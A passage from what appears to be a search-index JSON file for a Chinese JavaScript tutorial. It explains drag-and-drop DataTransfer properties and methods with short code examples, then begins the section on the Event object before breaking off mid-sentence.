\u5c5e\u6027\u7528\u6765\u8bbe\u7f6e\u653e\u4e0b\uff08drop\uff09\u88ab\u62d6\u62c9\u8282\u70b9\u65f6\u7684\u6548\u679c\uff0c\u4f1a\u5f71\u54cd\u5230\u62d6\u62c9\u7ecf\u8fc7\u76f8\u5173\u533a\u57df\u65f6\u9f20\u6807\u7684\u5f62\u72b6\u3002\u5b83\u53ef\u80fd\u53d6\u4e0b\u9762\u7684\u503c\u3002 copy\uff1a\u590d\u5236\u88ab\u62d6\u62c9\u7684\u8282\u70b9 move\uff1a\u79fb\u52a8\u88ab\u62d6\u62c9\u7684\u8282\u70b9 link\uff1a\u521b\u5efa\u6307\u5411\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u7684\u94fe\u63a5 none\uff1a\u65e0\u6cd5\u653e\u4e0b\u88ab\u62d6\u62c9\u7684\u8282\u70b9 \u9664\u4e86\u4e0a\u9762\u8fd9\u4e9b\u503c\uff0c\u8bbe\u7f6e\u5176\u4ed6\u7684\u503c\u90fd\u662f\u65e0\u6548\u7684\u3002 1 2 3 4 5 target . addEventListener ( 'dragover' , function ( e ) { e . preventDefault (); e . stopPropagation (); e . dataTransfer . dropEffect = 'copy' ; }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u88ab\u62d6\u62c9\u5143\u7d20\u4e00\u65e6 drop \uff0c\u63a5\u53d7\u7684\u533a\u57df\u4f1a\u590d\u5236\u8be5\u8282\u70b9\u3002 dropEffect \u5c5e\u6027\u4e00\u822c\u5728 dragenter \u548c dragover \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\u8bbe\u7f6e\uff0c\u5bf9\u4e8e dragstart \u3001 drag \u3001 dragleave \u8fd9\u4e09\u4e2a\u4e8b\u4ef6\uff0c\u8be5\u5c5e\u6027\u4e0d\u8d77\u4f5c\u7528\u3002\u56e0\u4e3a\u8be5\u5c5e\u6027\u53ea\u5bf9\u63a5\u53d7\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u7684\u533a\u57df\u6709\u6548\uff0c\u5bf9\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u672c\u8eab\u662f\u65e0\u6548\u7684\u3002\u8fdb\u5165\u76ee\u6807\u533a\u57df\u540e\uff0c\u62d6\u62c9\u884c\u4e3a\u4f1a\u521d\u59cb\u5316\u6210\u8bbe\u5b9a\u7684\u6548\u679c\u3002","title":"DataTransfer.dropEffect"},{"location":"events/drag/#datatransfereffectallowed","text":"DataTransfer.effectAllowed \u5c5e\u6027\u8bbe\u7f6e\u672c\u6b21\u62d6\u62c9\u4e2d\u5141\u8bb8\u7684\u6548\u679c\u3002\u5b83\u53ef\u80fd\u53d6\u4e0b\u9762\u7684\u503c\u3002 copy\uff1a\u590d\u5236\u88ab\u62d6\u62c9\u7684\u8282\u70b9 move\uff1a\u79fb\u52a8\u88ab\u62d6\u62c9\u7684\u8282\u70b9 link\uff1a\u521b\u5efa\u6307\u5411\u88ab\u62d6\u62c9\u8282\u70b9\u7684\u94fe\u63a5 copyLink\uff1a\u5141\u8bb8 copy \u6216 link copyMove\uff1a\u5141\u8bb8 copy \u6216 move linkMove\uff1a\u5141\u8bb8 link \u6216 move all\uff1a\u5141\u8bb8\u6240\u6709\u6548\u679c none\uff1a\u65e0\u6cd5\u653e\u4e0b\u88ab\u62d6\u62c9\u7684\u8282\u70b9 uninitialized\uff1a\u9ed8\u8ba4\u503c\uff0c\u7b49\u540c\u4e8e all \u5982\u679c\u67d0\u79cd\u6548\u679c\u662f\u4e0d\u5141\u8bb8\u7684\uff0c\u7528\u6237\u5c31\u65e0\u6cd5\u5728\u76ee\u6807\u8282\u70b9\u4e2d\u8fbe\u6210\u8fd9\u79cd\u6548\u679c\u3002 \u8fd9\u4e2a\u5c5e\u6027\u4e0e dropEffect \u5c5e\u6027\u662f\u540c\u4e00\u4ef6\u4e8b\u7684\u4e24\u4e2a\u65b9\u9762\u3002\u524d\u8005\u8bbe\u7f6e\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u5141\u8bb8\u7684\u6548\u679c\uff0c\u540e\u8005\u8bbe\u7f6e\u63a5\u53d7\u62d6\u62c9\u7684\u533a\u57df\u7684\u6548\u679c\uff0c\u5b83\u4eec\u5f80\u5f80\u914d\u5408\u4f7f\u7528\u3002 dragstart \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u6765\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u3002\u5176\u4ed6\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u91cc\u9762\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u662f\u65e0\u6548\u7684\u3002 1 2 3 4 5 6 7 source . addEventListener ( 'dragstart' , function ( e ) { e . dataTransfer . effectAllowed = 'move' ; }); target . addEventListener ( 'dragover' , function ( e ) { e . dataTransfer . dropEffect = 'move' ; }); \u53ea\u8981 dropEffect \u5c5e\u6027\u548c effectAllowed \u5c5e\u6027\u4e4b\u4e2d\uff0c\u6709\u4e00\u4e2a\u4e3a none \uff0c\u5c31\u65e0\u6cd5\u5728\u76ee\u6807\u8282\u70b9\u4e0a\u5b8c\u6210 drop \u64cd\u4f5c\u3002","title":"DataTransfer.effectAllowed"},{"location":"events/drag/#datatransferfiles","text":"DataTransfer.files \u5c5e\u6027\u662f\u4e00\u4e2a FileList \u5bf9\u8c61\uff0c\u5305\u542b\u4e00\u7ec4\u672c\u5730\u6587\u4ef6\uff0c\u53ef\u4ee5\u7528\u6765\u5728\u62d6\u62c9\u64cd\u4f5c\u4e2d\u4f20\u9001\u3002\u5982\u679c\u672c\u6b21\u62d6\u62c9\u4e0d\u6d89\u53ca\u6587\u4ef6\uff0c\u5219\u8be5\u5c5e\u6027\u4e3a\u7a7a\u7684 FileList \u5bf9\u8c61\u3002 \u4e0b\u9762\u5c31\u662f\u4e00\u4e2a\u63a5\u6536\u62d6\u62c9\u6587\u4ef6\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"output\" style=\"min-height: 200px;border: 1px solid black;\"> // \u6587\u4ef6\u62d6\u62c9\u5230\u8fd9\u91cc // </div> var div = document . getElementById ( 'output' ); div . addEventListener ( \"dragenter\" , function ( event ) { div . textContent = '' ; event . stopPropagation (); event . preventDefault (); }, false ); div . addEventListener ( \"dragover\" , function ( event ) { event . stopPropagation (); event . preventDefault (); }, false ); div . addEventListener ( \"drop\" , function ( event ) { event . stopPropagation (); event . preventDefault (); var files = event . dataTransfer . files ; for ( var i = 0 ; i < files . length ; i ++ ) { div . textContent += files [ i ]. name + ' ' + files [ i ]. size + '\u5b57\u8282\\n' ; } }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7 dataTransfer.files \u5c5e\u6027\u8bfb\u53d6\u88ab\u62d6\u62c9\u7684\u6587\u4ef6\u7684\u4fe1\u606f\u3002\u5982\u679c\u60f3\u8981\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u5c31\u8981\u4f7f\u7528 FileReader \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 div . addEventListener ( 'drop' , function ( e ) { e . preventDefault (); e . stopPropagation (); var fileList = e . dataTransfer . files ; if ( fileList . length > 0 ) { var file = fileList [ 0 ]; var reader = new FileReader (); reader . onloadend = function ( e ) { if ( e . target . readyState === FileReader . DONE ) { var content = reader . result ; div . innerHTML = 'File: ' + file . name + '\\n\\n' + content ; } } reader . readAsBinaryString ( file ); } });","title":"DataTransfer.files"},{"location":"events/drag/#datatransfertypes","text":"DataTransfer.types \u5c5e\u6027\u662f\u4e00\u4e2a\u53ea\u8bfb\u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a\u6210\u5458\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u91cc\u9762\u662f\u62d6\u62c9\u7684\u6570\u636e\u683c\u5f0f\uff08\u901a\u5e38\u662f MIME \u503c\uff09\u3002\u6bd4\u5982\uff0c\u5982\u679c\u62d6\u62c9\u7684\u662f\u6587\u5b57\uff0c\u5bf9\u5e94\u7684\u6210\u5458\u5c31\u662f text/plain \u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u901a\u8fc7\u68c0\u67e5 dataTransfer \u5c5e\u6027\u7684\u7c7b\u578b\uff0c\u51b3\u5b9a\u662f\u5426\u5141\u8bb8\u5728\u5f53\u524d\u8282\u70b9\u6267\u884c drop \u64cd\u4f5c\u3002 1 2 3 4 5 6 7 8 9 10 11 function contains ( list , value ){ for ( var i = 0 ; i < list . length ; ++ i ) { if ( list [ i ] === value ) return true ; } return false ; } function doDragOver ( event ) { var isLink = contains ( event . dataTransfer . types , 'text/uri-list' ); if ( isLink ) event . preventDefault (); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u6709\u5f53\u88ab\u62d6\u62c9\u7684\u8282\u70b9\u6709\u4e00\u4e2a\u662f\u94fe\u63a5\u65f6\uff0c\u624d\u5141\u8bb8\u5728\u5f53\u524d\u8282\u70b9\u653e\u4e0b\u3002","title":"DataTransfer.types"},{"location":"events/drag/#datatransferitems","text":"DataTransfer.items \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u53ea\u8bfb\u5bf9\u8c61\uff08DataTransferItemList \u5b9e\u4f8b\uff09\uff0c\u6bcf\u4e2a\u6210\u5458\u5c31\u662f\u672c\u6b21\u62d6\u62c9\u7684\u4e00\u4e2a\u5bf9\u8c61\uff08DataTransferItem \u5b9e\u4f8b\uff09\u3002\u5982\u679c\u672c\u6b21\u62d6\u62c9\u4e0d\u5305\u542b\u5bf9\u8c61\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002 DataTransferItemList \u5b9e\u4f8b\u5177\u6709\u4ee5\u4e0b\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 length \uff1a\u8fd4\u56de\u6210\u5458\u7684\u6570\u91cf add(data, type) \uff1a\u589e\u52a0\u4e00\u4e2a\u6307\u5b9a\u5185\u5bb9\u548c\u7c7b\u578b\uff08\u6bd4\u5982 text/html \u548c text/plain \uff09\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u6210\u5458 add(file) \uff1a add \u65b9\u6cd5\u7684\u53e6\u4e00\u79cd\u7528\u6cd5\uff0c\u589e\u52a0\u4e00\u4e2a\u6587\u4ef6\u4f5c\u4e3a\u6210\u5458 remove(index) \uff1a\u79fb\u9664\u6307\u5b9a\u4f4d\u7f6e\u7684\u6210\u5458 clear() \uff1a\u79fb\u9664\u6240\u6709\u7684\u6210\u5458 DataTransferItem \u5b9e\u4f8b\u5177\u6709\u4ee5\u4e0b\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 kind \uff1a\u8fd4\u56de\u6210\u5458\u7684\u79cd\u7c7b\uff08 string \u8fd8\u662f file \uff09\u3002 type \uff1a\u8fd4\u56de\u6210\u5458\u7684\u7c7b\u578b\uff08\u901a\u5e38\u662f MIME \u503c\uff09\u3002 getAsFile() \uff1a\u5982\u679c\u88ab\u62d6\u62c9\u662f\u6587\u4ef6\uff0c\u8fd4\u56de\u8be5\u6587\u4ef6\uff0c\u5426\u5219\u8fd4\u56de null \u3002 getAsString(callback) \uff1a\u5982\u679c\u88ab\u62d6\u62c9\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u5c06\u8be5\u5b57\u7b26\u4f20\u5165\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u5904\u7406\u3002\u8be5\u65b9\u6cd5\u662f\u5f02\u6b65\u7684\uff0c\u6240\u4ee5\u9700\u8981\u4f20\u5165\u56de\u8c03\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 div . addEventListener ( 'drop' , function ( e ) { e . preventDefault (); if ( e . dataTransfer . items != null ) { for ( var i = 0 ; i < e . dataTransfer . items . length ; i ++ ) { console . log ( e . dataTransfer . items [ i ]. kind + ': ' + e . dataTransfer . items [ i ]. type ); } } });","title":"DataTransfer.items"},{"location":"events/drag/#datatransfer_2","text":"","title":"DataTransfer \u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"events/drag/#datatransfersetdata","text":"DataTransfer.setData() \u65b9\u6cd5\u7528\u6765\u8bbe\u7f6e\u62d6\u62c9\u4e8b\u4ef6\u6240\u5e26\u6709\u7684\u6570\u636e\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 event . dataTransfer . setData ( 'text/plain' , 'Text to drag' ); \u4e0a\u9762\u4ee3\u7801\u4e3a\u5f53\u524d\u7684\u62d6\u62c9\u4e8b\u4ef6\u52a0\u5165\u7eaf\u6587\u672c\u6570\u636e\u3002 \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u5b57\u7b26\u4e32\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u6570\u636e\u7c7b\u578b\uff08\u6bd4\u5982 text/plain \uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5177\u4f53\u6570\u636e\u3002\u5982\u679c\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u5728 dataTransfer \u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u8fd9\u4e9b\u6570\u636e\u5c06\u88ab\u52a0\u5165\uff0c\u5426\u5219\u539f\u6709\u7684\u6570\u636e\u5c06\u88ab\u65b0\u6570\u636e\u66ff\u6362\u3002 \u5982\u679c\u662f\u62d6\u62c9\u6587\u672c\u6846\u6216\u8005\u62d6\u62c9\u9009\u4e2d\u7684\u6587\u672c\uff0c\u4f1a\u9ed8\u8ba4\u5c06\u5bf9\u5e94\u7684\u6587\u672c\u6570\u636e\uff0c\u6dfb\u52a0\u5230 dataTransfer \u5c5e\u6027\uff0c\u4e0d\u7528\u624b\u52a8\u6307\u5b9a\u3002 1 2 3 < div draggable = \"true\" > aaa </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u62d6\u62c9\u8fd9\u4e2a <div> \u5143\u7d20\u4f1a\u81ea\u52a8\u5e26\u4e0a\u6587\u672c\u6570\u636e aaa \u3002 \u4f7f\u7528 setData \u65b9\u6cd5\uff0c\u53ef\u4ee5\u66ff\u6362\u5230\u539f\u6709\u6570\u636e\u3002 1 2 3 4 5 6 < div draggable = \"true\" ondragstart = \"event.dataTransfer.setData('text/plain', 'bbb')\" > aaa </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u62d6\u62c9\u6570\u636e\u5b9e\u9645\u4e0a\u662f bbb \uff0c\u800c\u4e0d\u662f aaa \u3002 \u4e0b\u9762\u662f\u6dfb\u52a0\u5176\u4ed6\u7c7b\u578b\u7684\u6570\u636e\u3002\u7531\u4e8e text/plain \u662f\u6700\u666e\u904d\u652f\u6301\u7684\u683c\u5f0f\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u517c\u5bb9\u6027\uff0c\u5efa\u8bae\u6700\u540e\u603b\u662f\u4fdd\u5b58\u4e00\u4efd\u7eaf\u6587\u672c\u683c\u5f0f\u7684\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var dt = event . dataTransfer ; // \u6dfb\u52a0\u94fe\u63a5 dt . setData ( 'text/uri-list' , 'http://www.example.com' ); dt . setData ( 'text/plain' , 'http://www.example.com' ); // \u6dfb\u52a0 HTML \u4ee3\u7801 dt . setData ( 'text/html' , 'Hello there, <strong>stranger</strong>' ); dt . setData ( 'text/plain' , 'Hello there, <strong>stranger</strong>' ); // \u6dfb\u52a0\u56fe\u50cf\u7684 URL dt . setData ( 'text/uri-list' , imageurl ); dt . setData ( 'text/plain' , imageurl ); \u53ef\u4ee5\u4e00\u6b21\u63d0\u4f9b\u591a\u79cd\u683c\u5f0f\u7684\u6570\u636e\u3002 1 2 3 4 var dt = event . dataTransfer ; dt . setData ( 'application/x-bookmark' , bookmarkString ); dt . setData ( 'text/uri-list' , 'http://www.example.com' ); dt . setData ( 'text/plain' , 'http://www.example.com' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7\u5728\u540c\u4e00\u4e2a\u4e8b\u4ef6\u4e0a\u9762\uff0c\u5b58\u653e\u4e09\u79cd\u7c7b\u578b\u7684\u6570\u636e\uff0c\u4f7f\u5f97\u62d6\u62c9\u4e8b\u4ef6\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u5bf9\u8c61\u4e0a\u9762\uff0c drop \u4e0d\u540c\u7684\u503c\u3002\u6ce8\u610f\uff0c\u7b2c\u4e00\u79cd\u683c\u5f0f\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u683c\u5f0f\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u65e0\u6cd5\u8bfb\u53d6\uff0c\u8fd9\u610f\u5473\u7740\uff0c\u53ea\u6709\u67d0\u4e2a\u90e8\u7f72\u4e86\u7279\u5b9a\u4ee3\u7801\u7684\u8282\u70b9\uff0c\u624d\u53ef\u80fd drop \uff08\u8bfb\u53d6\u5230\uff09\u8fd9\u4e2a\u6570\u636e\u3002","title":"DataTransfer.setData()"},{"location":"events/drag/#datatransfergetdata","text":"DataTransfer.getData() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u8868\u793a\u6570\u636e\u7c7b\u578b\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e8b\u4ef6\u6240\u5e26\u7684\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\uff08\u901a\u5e38\u662f\u7528 setData \u65b9\u6cd5\u6dfb\u52a0\u7684\u6570\u636e\uff09\u3002\u5982\u679c\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002\u901a\u5e38\u53ea\u6709 drop \u4e8b\u4ef6\u89e6\u53d1\u540e\uff0c\u624d\u80fd\u53d6\u51fa\u6570\u636e\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a drop \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u7528\u6765\u53d6\u51fa\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u3002 1 2 3 4 5 function onDrop ( event ) { var data = event . dataTransfer . getData ( 'text/plain' ); event . target . textContent = data ; event . preventDefault (); } \u4e0a\u9762\u4ee3\u7801\u53d6\u51fa\u62d6\u62c9\u4e8b\u4ef6\u7684\u6587\u672c\u6570\u636e\uff0c\u5c06\u5176\u66ff\u6362\u6210\u5f53\u524d\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002\u6ce8\u610f\uff0c\u8fd9\u65f6\u8fd8\u5fc5\u987b\u53d6\u6d88\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u884c\u4e3a\uff0c\u56e0\u4e3a\u5047\u5982\u7528\u6237\u62d6\u62c9\u7684\u662f\u4e00\u4e2a\u94fe\u63a5\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u4f1a\u5728\u5f53\u524d\u7a97\u53e3\u6253\u5f00\u8fd9\u4e2a\u94fe\u63a5\u3002 getData \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u5176\u4e2d\u5305\u542b\u591a\u9879\u6570\u636e\uff0c\u5c31\u5fc5\u987b\u624b\u52a8\u89e3\u6790\u3002 1 2 3 4 5 6 7 8 9 10 function doDrop ( event ) { var lines = event . dataTransfer . getData ( 'text/uri-list' ). split ( '\\n' ); for ( let line of lines ) { let link = document . createElement ( 'a' ); link . href = line ; link . textContent = line ; event . target . appendChild ( link ); } event . preventDefault (); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c getData \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u7ec4\u94fe\u63a5\uff0c\u5c31\u5fc5\u987b\u81ea\u884c\u89e3\u6790\u3002 \u7c7b\u578b\u503c\u6307\u5b9a\u4e3a URL \uff0c\u53ef\u4ee5\u53d6\u51fa\u7b2c\u4e00\u4e2a\u6709\u6548\u94fe\u63a5\u3002 1 var link = event . dataTransfer . getData ( 'URL' ); \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u4ece\u591a\u79cd\u7c7b\u578b\u7684\u6570\u636e\u91cc\u9762\u53d6\u51fa\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 function doDrop ( event ) { var types = event . dataTransfer . types ; var supportedTypes = [ 'text/uri-list' , 'text/plain' ]; types = supportedTypes . filter ( function ( value ) { types . includes ( value ) }); if ( types . length ) { var data = event . dataTransfer . getData ( types [ 0 ]); } event . preventDefault (); }","title":"DataTransfer.getData()"},{"location":"events/drag/#datatransfercleardata","text":"DataTransfer.clearData() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u8868\u793a\u6570\u636e\u7c7b\u578b\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c\u5220\u9664\u4e8b\u4ef6\u6240\u5e26\u7684\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7c7b\u578b\uff0c\u5219\u5220\u9664\u6240\u6709\u6570\u636e\u3002\u5982\u679c\u6307\u5b9a\u7c7b\u578b\u4e0d\u5b58\u5728\uff0c\u5219\u8c03\u7528\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u6548\u679c\u3002 1 event . dataTransfer . clearData ( 'text/uri-list' ); \u4e0a\u9762\u4ee3\u7801\u6e05\u9664\u4e8b\u4ef6\u6240\u5e26\u7684 text/uri-list \u7c7b\u578b\u7684\u6570\u636e\u3002 \u8be5\u65b9\u6cd5\u4e0d\u4f1a\u79fb\u9664\u62d6\u62c9\u7684\u6587\u4ef6\uff0c\u56e0\u6b64\u8c03\u7528\u8be5\u65b9\u6cd5\u540e\uff0c DataTransfer.types \u5c5e\u6027\u53ef\u80fd\u4f9d\u7136\u4f1a\u8fd4\u56de Files \u7c7b\u578b\uff08\u524d\u63d0\u662f\u5b58\u5728\u6587\u4ef6\u62d6\u62c9\uff09\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 dragstart \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e4b\u4e2d\u4f7f\u7528\uff0c\u56e0\u4e3a\u8fd9\u662f\u62d6\u62c9\u64cd\u4f5c\u7684\u6570\u636e\u552f\u4e00\u53ef\u5199\u7684\u65f6\u673a\u3002","title":"DataTransfer.clearData()"},{"location":"events/drag/#datatransfersetdragimage","text":"\u62d6\u52a8\u8fc7\u7a0b\u4e2d\uff08 dragstart \u4e8b\u4ef6\u89e6\u53d1\u540e\uff09\uff0c\u6d4f\u89c8\u5668\u4f1a\u663e\u793a\u4e00\u5f20\u56fe\u7247\u8ddf\u968f\u9f20\u6807\u4e00\u8d77\u79fb\u52a8\uff0c\u8868\u793a\u88ab\u62d6\u52a8\u7684\u8282\u70b9\u3002\u8fd9\u5f20\u56fe\u7247\u662f\u81ea\u52a8\u521b\u9020\u7684\uff0c\u901a\u5e38\u663e\u793a\u4e3a\u88ab\u62d6\u52a8\u8282\u70b9\u7684\u5916\u89c2\uff0c\u4e0d\u9700\u8981\u81ea\u5df1\u52a8\u624b\u8bbe\u7f6e\u3002 DataTransfer.setDragImage() \u65b9\u6cd5\u53ef\u4ee5\u81ea\u5b9a\u4e49\u8fd9\u5f20\u56fe\u7247\u3002\u5b83\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u662f <img> \u8282\u70b9\u6216\u8005 <canvas> \u8282\u70b9\uff0c\u5982\u679c\u7701\u7565\u6216\u4e3a null \uff0c\u5219\u4f7f\u7528\u88ab\u62d6\u52a8\u7684\u8282\u70b9\u7684\u5916\u89c2\uff1b\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e3a\u9f20\u6807\u76f8\u5bf9\u4e8e\u8be5\u56fe\u7247\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 /* HTML \u4ee3\u7801\u5982\u4e0b <div id=\"drag-with-image\" class=\"dragdemo\" draggable=\"true\"> drag me </div> */ var div = document . getElementById ( 'drag-with-image' ); div . addEventListener ( 'dragstart' , function ( e ) { var img = document . createElement ( 'img' ); img . src = 'http://path/to/img' ; e . dataTransfer . setDragImage ( img , 0 , 0 ); }, false );","title":"DataTransfer.setDragImage()"},{"location":"events/event/","text":"Event \u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 \u4e8b\u4ef6\u53d1\u751f\u4ee5\u540e\uff0c\u4f1a\u4ea7\u751f\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u7ed9\u76d1\u542c\u51fd\u6570\u3002\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a Event \u5bf9\u8c61\uff0c\u6240\u6709\u7684\u4e8b\u4ef6\u90fd\u662f\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u6216\u8005\u8bf4\u7ee7\u627f\u4e86 Event.prototype \u5bf9\u8c61\u3002 Event \u5bf9\u8c61\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u6765\u751f\u6210\u65b0\u7684\u5b9e\u4f8b\u3002 1 event = new Event ( type , options ); Event \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570 type \u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u540d\u79f0\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570 options \u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8868\u793a\u4e8b\u4ef6\u5bf9\u8c61\u7684\u914d\u7f6e\u3002\u8be5\u5bf9\u8c61\u4e3b\u8981\u6709\u4e0b\u9762\u4e24\u4e2a\u5c5e\u6027\u3002 bubbles \uff1a\u5e03\u5c14\u503c\uff0c\u53ef\u9009\uff0c\u9ed8\u8ba4\u4e3a false \uff0c\u8868\u793a\u4e8b\u4ef6\u5bf9\u8c61\u662f\u5426\u5192\u6ce1\u3002 cancelable \uff1a\u5e03\u5c14\u503c\uff0c\u53ef\u9009\uff0c\u9ed8\u8ba4\u4e3a false \uff0c\u8868\u793a\u4e8b\u4ef6\u662f\u5426\u53ef\u4ee5\u88ab\u53d6\u6d88\uff0c\u5373\u80fd\u5426\u7528 Event.preventDefault() \u53d6\u6d88\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u4e00\u65e6\u4e8b\u4ef6\u88ab\u53d6\u6d88\uff0c\u5c31\u597d\u50cf\u4ece\u6765\u6ca1\u6709\u53d1\u751f\u8fc7\uff0c\u4e0d\u4f1a\u89e6\u53d1\u6d4f\u89c8\u5668\u5bf9\u8be5\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a\u3002 1 2 3 4 5 6 7 8 var ev = new Event ( 'look' , { 'bubbles' : true , 'cancelable' : false } ); document . dispatchEvent ( ev ); \u4e0a\u9762\u4ee3\u7801\u65b0\u5efa\u4e00\u4e2a look \u4e8b\u4ef6\u5b9e\u4f8b\uff0c\u7136\u540e\u4f7f\u7528 dispatchEvent \u65b9\u6cd5\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u4e0d\u662f\u663e\u5f0f\u6307\u5b9a bubbles \u5c5e\u6027\u4e3a true \uff0c\u751f\u6210\u7684\u4e8b\u4ef6\u5c31\u53ea\u80fd\u5728\u201c\u6355\u83b7\u9636\u6bb5\u201d\u89e6\u53d1\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u4e3a // <div><p>Hello</p></div> var div = document . querySelector ( 'div' ); var p = document . querySelector ( 'p' ); function callback ( event ) { var tag = event . currentTarget . tagName ; console . log ( 'Tag: ' + tag ); // \u6ca1\u6709\u4efb\u4f55\u8f93\u51fa } div . addEventListener ( 'click' , callback , false ); var click = new Event ( 'click' ); p . dispatchEvent ( click ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5143\u7d20\u53d1\u51fa\u4e00\u4e2a click \u4e8b\u4ef6\uff0c\u8be5\u4e8b\u4ef6\u9ed8\u8ba4\u4e0d\u4f1a\u5192\u6ce1\u3002 div.addEventListener \u65b9\u6cd5\u6307\u5b9a\u5728\u5192\u6ce1\u9636\u6bb5\u76d1\u542c\uff0c\u56e0\u6b64\u76d1\u542c\u51fd\u6570\u4e0d\u4f1a\u89e6\u53d1\u3002\u5982\u679c\u5199\u6210 div.addEventListener('click', callback, true) 